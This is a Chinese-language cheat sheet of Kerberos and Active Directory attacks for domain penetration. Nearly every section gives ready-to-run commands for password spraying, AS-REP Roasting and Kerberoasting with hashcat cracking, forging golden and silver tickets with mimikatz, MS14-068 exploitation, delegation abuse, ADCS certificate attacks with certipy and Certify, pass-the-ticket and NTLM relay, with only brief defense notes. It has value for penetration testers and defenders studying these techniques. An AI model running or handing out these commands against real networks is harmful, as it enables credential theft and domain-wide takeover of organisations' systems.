# Kerberos 认证攻击速查

## 0x01 概述
域渗透的核心打法几乎都绕不开 Kerberos。本篇记录 Kerberos 流程速览与经典攻击：密码喷洒与用户枚举、AS-REP Roasting、Kerberoasting、黄金/白银票据、MS14-068、委派攻击、ADCS 证书攻击、票据传递、NTLM Relay。

## 0x02 Kerberos 流程速览

```text
1. AS-REQ  客户端 -> KDC        用口令 hash 加密时间戳，请求 TGT
2. AS-REP  KDC -> 客户端        返回 TGT（krbtgt 密钥加密）
3. TGS-REQ 客户端 -> KDC        用 TGT 请求某服务的服务票据 ST
4. TGS-REP KDC -> 客户端        返回 ST（服务账号密钥加密）
5. AP-REQ  客户端 -> 服务       出示 ST 访问服务
```

攻击的核心观察：**第 2 步和第 4 步返回的数据都是用"口令派生密钥"加密的，拿到后可离线爆破**。

## 0x03 密码喷洒与用户枚举
### Kerberos 用户名枚举
原理：向 KDC 发送不带预认证数据的 AS-REQ，靠响应差异判断用户是否存在——
- 用户存在：返回 `KDC_ERR_PREAUTH_REQUIRED`（要求预认证）
- 用户不存在：返回 `KDC_ERR_C_PRINCIPAL_UNKNOWN`（PRINCIPAL UNKNOWN）

全程不验证密码、不触发锁定，比撞 SMB/IPC 干净得多。

```bash
kerbrute userenum --dc 192.168.1.10 -d domain.com user.txt
```

### 密码喷洒
一个密码试遍一批用户（而非一个用户试遍所有密码），每个用户只错一次，避开锁定阈值。密码选大概率存在的：`Passw0rd!`、`公司名@2024`、`Season2024!`。

```bash
# kerbrute 走 Kerberos，速度快
kerbrute passwordspray --dc 192.168.1.10 -d domain.com users.txt 'Passw0rd!'

# CME 走 SMB 验证，成功即得到一组可用凭据
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Passw0rd!' --continue-on-success

# sprayhound：自动读取锁定策略、控制喷洒节奏，结果可直接导入 BloodHound
```

喷洒前先摸清锁定策略（`crackmapexec smb <ip> -u u -p p --pass-pol`），喷洒间隔必须大于锁定期。

## 0x04 AS-REP Roasting
### 原理
账户设置了 `DONT_REQUIRE_PREAUTH` 时，任何人都能以该用户名义请求 AS-REP，拿回可离线爆破的数据。

### 操作

```bash
# impacket，无需凭据，用户列表枚举
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# 有凭据时指定用户
GetNPUsers.py domain.local/user:password -request
```

爆破：`hashcat -m 18200 asrep.txt dict.txt`

## 0x05 Kerberoasting
### 原理
域内任何用户都能为注册了 SPN 的服务账号请求 ST（TGS-REP），该票据用服务账号口令加密，可离线爆破。服务账号常用弱口令且权限高，是域内最性价比的突破口。

### 操作

```bash
# impacket
GetUserSPNs.py domain.local/user:password -request -outputfile tgs.txt

# Windows: Rubeus
Rubeus.exe kerberoast /outfile:tgs.txt
```

爆破：`hashcat -m 13100 tgs.txt dict.txt`

## 0x06 黄金票据与白银票据
### 对比
| 维度 | 黄金票据 | 白银票据 |
| --- | --- | --- |
| 伪造对象 | TGT | 服务票据 ST |
| 需要的密钥 | krbtgt 账户 hash | 目标服务账号 hash |
| 生效范围 | 全域任意服务 | 仅指定服务 |
| 与 KDC 交互 | 伪造后可直接要 ST | 完全不接触 KDC，更隐蔽 |

### 黄金票据（mimikatz）

```text
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:<hash> /ptt
```

### 白银票据（mimikatz）

```text
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:<服务账号hash> /ptt
```

`/ptt` 直接注入当前会话；impacket 侧用 `ticketer.py` 生成 `.ccache` 配合 `KRB5CCNAME` 使用。

## 0x07 MS14-068
### 原理
KDC 对 PAC（Privilege Attribute Certificate，附加在票据里、记录用户组 SID 等特权信息的结构）的签名校验存在缺陷（CVE-2014-6324）：普通域用户可伪造一个包含高权限组 SID（如 Domain Admins）的 PAC 随 AS-REQ 提交，KDC 照单全收签发 TGT——等价于任意域用户提权到域管。2014 年 KB3011780 修复，未打补丁的老环境仍可遇到。

### 利用流程

```text
1. whoami /user                                              # 拿当前用户完整 SID
2. ms14-068.exe -u user@domain.local -p 'Passw0rd!' -s S-1-5-21-xxx-xxx-xxx-1105 -d dc01.domain.local
   # pykek 生成 TGT_user@domain.local.ccache（伪造高权限 PAC 的 TGT）
3. klist purge                                               # 清空当前会话正常票据
4. 导入伪造票据：mimikatz "kerberos::ptc TGT_user@domain.local.ccache"（MIT Kerberos 环境用 kinit 导入 ccache）
5. psexec \\dc01.domain.local cmd                            # 域管权限直达，拿 SYSTEM
```

Linux 侧一条命令等价（impacket 自动完成构造与利用）：

```bash
goldenPac.py domain.local/user:'Passw0rd!'@dc01.domain.local
```

### 防御
打 KB3011780；利用成功会在域控留 4768（预认证失败/异常 PAC）等特征日志，蓝队可据此回溯。

## 0x08 委派攻击
### 三种委派
| 类型 | 特征 | 利用思路 |
| --- | --- | --- |
| 非约束委派 | 服务可拿用户完整 TGT | 诱导高权限账户访问该主机（配合打印机 bug/PetitPotam 强制认证）-> 导出 TGT |
| 约束委派 | 服务仅能假冒用户访问指定服务 | 拿服务账号后 `getST.py -spn-to-spn` 链式换票 |
| 基于资源的约束委派（RBCD） | 委派配置存在目标机器上 | 有机器账户写权限时给自己配置 RBCD -> S4U 拿管理员 ST |

### 常用命令

```bash
# 查询非约束委派主机（PowerView）
Get-DomainComputer -Unconstrained

# impacket S4U 利用（RBCD/约束委派通用姿势）
getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/computer$ -hashes :<hash>
```

## 0x09 ADCS 证书攻击
### 原理
一句话：ADCS（AD 证书服务）是域内密码之外的另一大凭证源，证书可直接用于 Kerberos（PKINIT）认证换 TGT——拿到一张能代表高权限用户的证书，等价于拿到他的密码。模板/CA/注册接口的配置失误让低权限用户能以任意身份申请证书，是当代域渗透的重点攻击面。

### ESC1-ESC8 误配速查
| 编号 | 误配点 | 一句话 |
| --- | --- | --- |
| ESC1 | 模板允许申请者自定 SAN 且普通用户可注册 | 直接申请一张"administrator 的证书" |
| ESC2 | 模板 EKU 为 Any Purpose 或缺失 | 证书用途不设限，客户端/服务器认证通吃 |
| ESC3 | 模板 EKU 为 Certificate Request Agent | 拿它当"代理凭证"，再以任意用户身份申请其他模板 |
| ESC4 | 普通用户对模板对象有写权限 | 把模板改成 ESC1 形态后自己申请 |
| ESC5 | 对 CA 相关 AD 对象（安全描述符/组件服务）有控制权 | 间接篡改 CA 配置、模板 ACL |
| ESC6 | CA 启用 EDITF_ATTRIBUTESUBJECTALTNAME2 | CA 级放行任意 SAN，ESC1 的全局放大版 |
| ESC7 | 普通用户在 CA 上有 ManageCA/ManageCertificates | 可自行批准挂起请求、修改 CA 设置 |
| ESC8 | Web 注册接口启用 NTLM 认证 | 把受害者 NTLM 中继到接口，以他的身份出证书 |

### certipy 全套（Linux 侧）

```bash
# 枚举：全量模板 + 标记可滥用项（加 -bloodhound 可产出直接导入 BloodHound 的 zip）
certipy find -u user@domain.local -p 'Passw0rd!' -dc-ip 192.168.1.10 -vulnerable

# 申请：以 administrator 身份申请易受攻击模板的证书（ESC1 姿势，-upn 指定冒充对象）
certipy req -u user@domain.local -p 'Passw0rd!' -ca corp-CA -template VulnTemplate -upn administrator@domain.local

# 认证：用 pfx 走 PKINIT 换 TGT，拿到 administrator 的票据与 NT hash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
```

### PassTheCert
一句话：证书本身就是凭证——拿到用户 pfx 后无需破解密码即可直接认证（Kerberos/PKINIT 或 Schannel/LDAPS 绑定），即 Pass the Cert。

### Windows 侧
Certify（GhostPack）：

```text
Certify.exe find /vulnerable
Certify.exe request /ca:dc01.domain.local\corp-CA /template:VulnTemplate /altname:administrator
```

### 防御
收紧模板注册权限与 SAN/EKU 配置、给 CA 打齐补丁（含 Certifried/CVE-2022-26923 等证书提权链）、关闭 Web 注册接口 NTLM、用 Locksmith 等工具定期体检配置。

## 0x0A 票据传递
```bash
# 导出当前机器上的票据
mimikatz "sekurlsa::tickets /export"

# 注入使用
Rubeus.exe ptt /ticket:xxx.kirbi
```

Linux 侧统一走 `.ccache` + `KRB5CCNAME` 环境变量，impacket 全家桶原生支持 `-k -no-pass`。

## 0x0B NTLM Relay（简要）
### 原理
中间人抓取网络协议中的 NTLM 质询应答（Net-NTLM），不破解、原样转发给目标服务冒充受害者完成认证——本质是"借他人的手登录"。

```bash
# Responder：LLMNR/NBT-NS/mDNS 毒化，抓 Net-NTLMv2
responder -I eth0

# impacket：把抓到的认证中继到目标清单（SMB2）
ntlmrelayx.py -tf targets.txt -smb2support
```

### 典型打法
- 目标未启用 SMB 签名时中继打域控：导出 SAM/LSA、落地执行；配 `--delegate-access` 走 RBCD 直接拿机器（接 0x08 委派）
- LDAP(S) 中继改域配置；ADCS Web 注册接口（ESC8）是当前高发中继落点（接 0x09）
- 触发强制认证的手段（打印机 bug/PetitPotam 等）不在此展开

### 防御
- 强制 SMB/LDAP 签名（SMB 签名 2022 起域控默认启用）
- EPA（Extended Protection for Authentication）防中继到 ADWS/LDAP
- 关闭 LLMNR/NBT-NS 毒化面，Web 注册接口禁用 NTLM

Net-NTLM 抓取细节、hashcat 爆破与 Potato 系列见 [PEN-GetHash](./PEN-GetHash.md)。

## 0x0C 注意事项
- 票据有有效期（默认 10 小时），黄金票据默认 10 年但要注意 krbtgt 密码重置两次则全部失效（防御方止血标准动作）
- 离线爆破不产生告警，在线枚举 SPN/AS-REP 会产生日志，量要控制
- 2020 后新环境多为 AES 票据，老工具注意 RC4 降级被禁的场景

## 0x0D 参考
- [Impacket](https://github.com/fortra/impacket)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [域渗透笔记@uknowsec](https://github.com/uknowsec/Active-Directory-Pentest-Notes)
- [kerbrute](https://github.com/ropnop/kerbrute)
- [pykek（MS14-068）](https://github.com/preempt/pykek)
- [Certipy](https://github.com/ly4k/Certipy)
- [Certify](https://github.com/GhostPack/Certify)
- [sprayhound](https://github.com/Hackndo/sprayhound)
- [Certified Pre-Owned（SpecterOps，ESC1-8 开山文）](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
